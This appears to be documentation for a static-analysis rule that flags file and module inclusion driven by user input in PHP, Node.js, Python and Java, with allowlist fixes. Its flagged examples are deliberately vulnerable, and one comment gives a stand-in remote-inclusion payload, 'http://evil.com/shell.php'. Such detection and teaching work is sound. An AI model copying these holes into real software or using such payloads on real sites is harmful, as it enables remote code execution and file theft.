description: "Detect dynamic code loading using user-controlled paths: PHP Remote File Inclusion via $_GET, Node.js dynamic require, Python __import__ with user input, and Java Class.forName with request parameters."
---

## Overview

This rule flags code that dynamically loads or includes files or classes where the path or name is derived from user-controlled input. In PHP, `include($_GET['page'])` allows an attacker to include arbitrary remote URLs (Remote File Inclusion, RFI) or local files (Local File Inclusion, LFI). In Node.js, `require(req.query.module)` allows loading attacker-specified modules. This maps to [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html).

**Severity:** Critical | **CWE:** [CWE-829](https://cwe.mitre.org/data/definitions/829.html)

## Why This Matters

Remote File Inclusion allows an attacker to execute arbitrary PHP code hosted on a server they control, achieving full remote code execution. Local File Inclusion allows reading arbitrary files from the server (e.g., `/etc/passwd`, application config files with credentials). Dynamic `require()` in Node.js and `Class.forName()` in Java with user input can load attacker-controlled code paths.

## What Gets Flagged

```php
// FLAGGED: PHP Remote File Inclusion
$page = $_GET['page'];
include($page);              // attacker can pass http://evil.com/shell.php
include_once($_GET['file']);
require($_REQUEST['module']);
```

```javascript
// FLAGGED: dynamic require with user input
const moduleName = req.query.module;
const mod = require(moduleName);  // arbitrary module loading

const plugin = req.body.plugin;
require('./' + plugin);
```

```python
# FLAGGED: __import__ with user-controlled module name
module_name = request.GET.get('module')
mod = __import__(module_name)

# FLAGGED: importlib with user input
import importlib
plugin = request.POST.get('plugin')
importlib.import_module(plugin)
```

```java
// FLAGGED: Class.forName with request parameter
String className = request.getParameter("class");
Class<?> cls = Class.forName(className);  // arbitrary class loading
```

## Remediation

```php
// SAFE: allowlist of permitted pages
$allowed_pages = ['home', 'about', 'contact', 'products'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed_pages)) {
    $page = 'home';
}
include('./pages/' . $page . '.php');
```

```javascript
// SAFE: allowlist of permitted modules
const ALLOWED_PLUGINS = new Set(['pluginA', 'pluginB', 'pluginC']);
const pluginName = req.query.plugin;
if (!ALLOWED_PLUGINS.has(pluginName)) {
    return res.status(400).json({ error: 'Unknown plugin' });
}
const plugin = require('./plugins/' + pluginName);
```

```python
# SAFE: allowlist of permitted modules
ALLOWED_MODULES = {'math', 'json', 'base64'}
module_name = request.GET.get('module')
if module_name not in ALLOWED_MODULES:
    return HttpResponseBadRequest("Unknown module")
mod = importlib.import_module(module_name)
```

```java
// SAFE: allowlist of permitted class names
Map<String, Class<?>> ALLOWED_CLASSES = Map.of(
    "processor.JsonProcessor", JsonProcessor.class,
    "processor.XmlProcessor", XmlProcessor.class
);
String className = request.getParameter("class");
Class<?> cls = ALLOWED_CLASSES.get(className);
if (cls == null) {
    response.sendError(400, "Unknown class");
    return;
}
```

Never allow user input to directly control what files or modules are loaded. Use an allowlist that maps user-facing identifiers to known-safe implementation classes or file paths.
